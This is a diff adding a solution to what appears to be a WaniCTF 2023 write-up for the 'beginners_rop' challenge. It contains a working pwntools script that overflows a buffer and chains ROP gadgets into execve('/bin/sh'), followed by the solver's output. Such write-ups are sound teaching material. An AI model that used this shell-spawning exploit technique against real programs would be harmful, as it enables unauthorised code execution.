@@ -372,3 +372,53 @@ time.sleep(1)
 io.sendline(b"cat FLAG")
 io.stream()
 ```
+
+## beginners_rop
+
+- https://github.com/wani-hackase/wanictf2023-writeup/tree/main/pwn/beginners_rop
+
+```python
+#!/usr/bin/env python3
+from pwn import ELF, ROP, args, context, flat, log, process, remote
+from pwnlib import gdb
+
+exe = context.binary = ELF("file/chall", checksec=False)
+if args.GDB:
+    io = gdb.debug(exe.path, gdbscript="b main\nc")
+elif args.REMOTE:
+    io = remote("::1", 9005)
+else:
+    io = process(exe.path)
+
+rop = ROP(exe)
+rop.raw(0x000000000040139c)  # mov rdi, rsp; add rsp, 8; ret;
+rop.raw(b"/bin/sh\x00")
+rop.raw(0x000000000040137e)  # xor rsi, rsi; ret;
+rop.raw(0x000000000040138d)  # xor rdx, rdx; ret;
+# # rop.raw(0x0000000000401371)  # pop rax; ret;
+# # rop.raw(59)
+rop.rax = 59
+# execve("/bin/sh", 0, 0): syscall 59
+rop.raw(rop.syscall.address)  # 0x00000000004013af: syscall; ret;
+log.info("ROP:\n%s", rop.dump())
+io.sendlineafter(b" > ", flat(b"A"*0x28, rop.chain()))
+io.sendline(b"cat FLAG")
+io.stream()
+```
+
+## Answer
+
+```zsh
+./solver.py REMOTE
+[+] Opening connection to ::1 on port 9005: Done
+[*] Loaded 7 cached gadgets for 'file/chall'
+[*] ROP:
+    0x0000:         0x40139c
+    0x0008:   b'/bin/sh\x00' b'/bin/sh\x00'
+    0x0010:         0x40137e
+    0x0018:         0x40138d
+    0x0020:         0x401371 pop rax; ret
+    0x0028:             0x3b
+    0x0030:         0x4013af syscall; ret
+ (snip)
+```
